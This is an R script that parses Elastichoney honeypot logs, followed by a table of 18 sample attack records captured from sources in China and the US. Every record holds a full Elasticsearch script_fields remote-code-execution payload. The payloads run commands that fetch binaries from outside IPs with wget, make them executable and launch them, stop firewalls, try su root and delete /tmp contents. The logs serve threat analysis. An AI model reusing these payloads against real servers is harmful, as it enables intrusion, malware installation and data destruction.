# Use only one time
install.packages("jsonlite")
library("jsonlite", lib.loc="~/R/win-library/3.1")
 
elastichoney <- function(filename) {
    # importing data file
    data <- fromJSON(filename)
 
    # slicing data for seperating the  dataframes and list within the dataframe
    data1 <- data[,!(names(data) %in% c("location", "headers", "geoip"))]
    col_header <- data$headers
    col_geoip <- data$geoip[,!(names(data$geoip) %in% c("location"))]
   
    # joining all three dataframes and assigning in global variables
    data3 <<- cbind(data1,col_header,col_geoip)
    #  write.csv(x = data3, "logs.csv")
}
return(a <- data3)
elastichoney("logs.json")



Sample 20 records from the logs.csv file

	region_name	latitude	ip	continent_code	country_code3	country_code2	longitude	country_name	city_name	timezone	real_region_name	area_code	postal_code	dma_code	host	content_type	user_agent	accept_language	major	os_name	name	form	source	url	os	@timestamp	method	host	@version	device	honeypot	type	payload	minor	os_major	os_minor	patch
1	4	32.0617	58.220.3.207	AS	CHN	CN	118.7778	China	Nanjing	Asia/Shanghai	Jiangsu	NA	NA	NA	x.x.x.x:9200		python-requests/2.4.1 CPython/2.7.8 Windows/2003Server		2	Windows	Python Requests	NA	58.220.3.207	x.x.x.x:9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22curl+-o+%2Ftmp%2Fxun32%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D	Windows	2015-03-21T11:39:23.975Z	GET	127.0.0.1:40093	1	Other	x.x.x.x	attack	source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"curl+-o+/tmp/xun32\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}	4	NA	NA	NA
2	4	32.0617	58.220.3.207	AS	CHN	CN	118.7778	China	Nanjing	Asia/Shanghai	Jiangsu	NA	NA	NA	x.x.x.x:9200		python-requests/2.4.1 CPython/2.7.8 Windows/2003Server		2	Windows	Python Requests	NA	58.220.3.207	x.x.x.x:9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22su+root%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D	Windows	2015-03-21T11:39:24.761Z	GET	127.0.0.1:40095	1	Other	x.x.x.x	attack	source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"su+root\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}	4	NA	NA	NA
3	2	27.9994	115.234.254.53	AS	CHN	CN	120.6668	China	Wenzhou	Asia/Shanghai	Zhejiang	NA	NA	NA	x.x.x.x:9200		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)		6	Windows 2000	IE	NA	115.234.254.53	x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget%20http-URL-http%3A%2F%2F222.186.42.27%3A8999%2Fserv6%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D	Windows 2000	2015-03-21T04:09:27.131Z	GET	127.0.0.1:40035	1	Other	x.x.x.x	attack	source={"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import+java.util.*;\nimport+java.io.*;\nString+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"wget+http-URL-http://222.186.42.27:8999/serv6\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}	0	NA	NA	NA
4	2	27.9994	115.234.254.53	AS	CHN	CN	120.6668	China	Wenzhou	Asia/Shanghai	Zhejiang	NA	NA	NA	x.x.x.x:9200		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)		6	Windows 2000	IE	NA	115.234.254.53	x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod%20777%20tmp%2Fserv6%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D	Windows 2000	2015-03-21T04:29:06.119Z	GET	127.0.0.1:40065	1	Other	x.x.x.x	attack	source={"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import+java.util.*;\nimport+java.io.*;\nString+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"chmod+777+tmp/serv6\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}	0	NA	NA	NA
5	2	27.9994	115.234.254.53	AS	CHN	CN	120.6668	China	Wenzhou	Asia/Shanghai	Zhejiang	NA	NA	NA	x.x.x.x:9200		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)		6	Windows 2000	IE	NA	115.234.254.53	x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22service%20iptables%20stop%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D	Windows 2000	2015-03-21T04:09:09.857Z	GET	127.0.0.1:40029	1	Other	x.x.x.x	attack	source={"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import+java.util.*;\nimport+java.io.*;\nString+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"service+iptables+stop\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}	0	NA	NA	NA
6	2	27.9994	115.234.254.53	AS	CHN	CN	120.6668	China	Wenzhou	Asia/Shanghai	Zhejiang	NA	NA	NA	x.x.x.x:9200		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)		6	Windows 2000	IE	NA	115.234.254.53	x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22SuSEfirewall2%20stop%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D	Windows 2000	2015-03-21T02:41:16.703Z	GET	127.0.0.1:40017	1	Other	x.x.x.x	attack	source={"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import+java.util.*;\nimport+java.io.*;\nString+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"SuSEfirewall2+stop\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}	0	NA	NA	NA
7	2	27.9994	115.234.254.53	AS	CHN	CN	120.6668	China	Wenzhou	Asia/Shanghai	Zhejiang	NA	NA	NA	x.x.x.x:9200		Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)		6	Windows 2000	IE	NA	115.234.254.53	x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22SuSEfirewall2%20stop%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D	Windows 2000	2015-03-21T04:38:06.460Z	GET	127.0.0.1:40073	1	Other	x.x.x.x	attack	source={"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import+java.util.*;\nimport+java.io.*;\nString+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"SuSEfirewall2+stop\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}	0	NA	NA	NA
8	4	32.0617	58.220.3.207	AS	CHN	CN	118.7778	China	Nanjing	Asia/Shanghai	Jiangsu	NA	NA	NA	x.x.x.x:9200		python-requests/2.4.1 CPython/2.7.8 Windows/2003Server		2	Windows	Python Requests	NA	58.220.3.207	x.x.x.x:9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22rm+%2Ftmp%2F%2A%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D	Windows	2015-03-21T11:39:22.543Z	GET	127.0.0.1:40089	1	Other	x.x.x.x	attack	source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"rm+/tmp/*\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}	4	NA	NA	NA
9	CA	34.1173	173.247.232.245	NA	USA	US	-118.26	United States	Los Angeles	America/Los_Angeles	California	323	90039	803	x.x.x.x:9200	application/x-www-form-urlencoded	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)	zh-cn	6	Windows 2000	IE	NA	173.247.232.245	x.x.x.x:9200/_search?pretty	Windows 2000	2015-03-21T00:35:00.559Z	POST	127.0.0.1:39995	1	Other	x.x.x.x	attack	pretty=&{"size":1,"script_fields":+{"keyexp":+{"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"wget+-c+http://173.247.232.245:7213/armvs0320+-O+/tmp/armvs0320\").getInputStream())).readLines()","lang":+"groovy"}}}=	0	NA	NA	NA
10	4	32.0617	58.220.3.207	AS	CHN	CN	118.7778	China	Nanjing	Asia/Shanghai	Jiangsu	NA	NA	NA	x.x.x.x:9200		python-requests/2.4.1 CPython/2.7.8 Windows/2003Server		2	Windows	Python Requests	NA	58.220.3.207	x.x.x.x:9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget+-O+.%2Fxun64+http%3A%2F%2F58.220.3.207%3A888%2Fxun64%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D	Windows	2015-03-21T11:40:35.749Z	GET	127.0.0.1:40175	1	Other	x.x.x.x	attack	source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"wget+-O+./xun64+http://58.220.3.207:888/xun64\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}	4	NA	NA	NA
11	4	32.0617	58.220.3.207	AS	CHN	CN	118.7778	China	Nanjing	Asia/Shanghai	Jiangsu	NA	NA	NA	x.x.x.x:9200		python-requests/2.4.1 CPython/2.7.8 Windows/2003Server		2	Windows	Python Requests	NA	58.220.3.207	x.x.x.x:9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup+%2Ftmp%2Fxun64+%3E+%2Fdev%2Fnull+2%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D	Windows	2015-03-21T11:39:45.722Z	GET	127.0.0.1:40157	1	Other	x.x.x.x	attack	source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"nohup+/tmp/xun64+>+/dev/null+2>&1\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}	4	NA	NA	NA
12	4	32.0617	58.220.3.207	AS	CHN	CN	118.7778	China	Nanjing	Asia/Shanghai	Jiangsu	NA	NA	NA	x.x.x.x:9200		python-requests/2.4.1 CPython/2.7.8 Windows/2003Server		2	Windows	Python Requests	NA	58.220.3.207	x.x.x.x:9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod+777+%2Ftmp%2Fxun64%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D	Windows	2015-03-21T11:39:32.719Z	GET	127.0.0.1:40115	1	Other	x.x.x.x	attack	source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"chmod+777+/tmp/xun64\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}	4	NA	NA	NA
13	4	32.0617	58.220.3.207	AS	CHN	CN	118.7778	China	Nanjing	Asia/Shanghai	Jiangsu	NA	NA	NA	x.x.x.x:9200		python-requests/2.4.1 CPython/2.7.8 Windows/2003Server		2	Windows	Python Requests	NA	58.220.3.207	x.x.x.x:9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22service+iptables+stop%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D	Windows	2015-03-21T11:40:31.793Z	GET	127.0.0.1:40163	1	Other	x.x.x.x	attack	source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"service+iptables+stop\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}	4	NA	NA	NA
14	4	32.0617	58.220.3.207	AS	CHN	CN	118.7778	China	Nanjing	Asia/Shanghai	Jiangsu	NA	NA	NA	x.x.x.x:9200		python-requests/2.4.1 CPython/2.7.8 Windows/2003Server		2	Windows	Python Requests	NA	58.220.3.207	x.x.x.x:9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod+777+AAA.out%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D	Windows	2015-03-21T11:40:40.351Z	GET	127.0.0.1:40189	1	Other	x.x.x.x	attack	source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"chmod+777+AAA.out\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}	4	NA	NA	NA
15	4	32.0617	58.220.3.207	AS	CHN	CN	118.7778	China	Nanjing	Asia/Shanghai	Jiangsu	NA	NA	NA	x.x.x.x:9200		python-requests/2.4.1 CPython/2.7.8 Windows/2003Server		2	Windows	Python Requests	NA	58.220.3.207	x.x.x.x:9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22rm+-r+%2Ftmp%2F%2A%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D	Windows	2015-03-21T11:39:32.318Z	GET	127.0.0.1:40113	1	Other	x.x.x.x	attack	source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"rm+-r+/tmp/*\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}	4	NA	NA	NA
16	4	32.0617	58.220.3.207	AS	CHN	CN	118.7778	China	Nanjing	Asia/Shanghai	Jiangsu	NA	NA	NA	x.x.x.x:9200		python-requests/2.4.1 CPython/2.7.8 Windows/2003Server		2	Windows	Python Requests	NA	58.220.3.207	x.x.x.x:9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup+.%2Fxun64%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D	Windows	2015-03-21T11:40:37.025Z	GET	127.0.0.1:40179	1	Other	x.x.x.x	attack	source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"nohup+./xun64\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}	4	NA	NA	NA
17	4	32.0617	58.220.3.207	AS	CHN	CN	118.7778	China	Nanjing	Asia/Shanghai	Jiangsu	NA	NA	NA	x.x.x.x:9200		python-requests/2.4.1 CPython/2.7.8 Windows/2003Server		2	Windows	Python Requests	NA	58.220.3.207	x.x.x.x:9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22%2Ftmp%2Fxun32%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D	Windows	2015-03-21T11:39:41.970Z	GET	127.0.0.1:40147	1	Other	x.x.x.x	attack	source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"/tmp/xun32\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}	4	NA	NA	NA
18	4	32.0617	58.220.3.207	AS	CHN	CN	118.7778	China	Nanjing	Asia/Shanghai	Jiangsu	NA	NA	NA	x.x.x.x:9200		python-requests/2.4.1 CPython/2.7.8 Windows/2003Server		2	Windows	Python Requests	NA	58.220.3.207	x.x.x.x:9200/_search?source=%7B%22query%22%3A+%7B%22filtered%22%3A+%7B%22query%22%3A+%7B%22match_all%22%3A+%7B%7D%7D%7D%7D%2C+%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A+%22import+java.util.%2A%3Bimport+java.io.%2A%3BString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22su%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3Bsb.append%28%5C%22%5Cr%5Cn%5C%22%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%2C+%22size%22%3A+1%7D	Windows	2015-03-21T11:40:41.836Z	GET	127.0.0.1:40193	1	Other	x.x.x.x	attack	source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"su\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}	4	NA	NA	NA
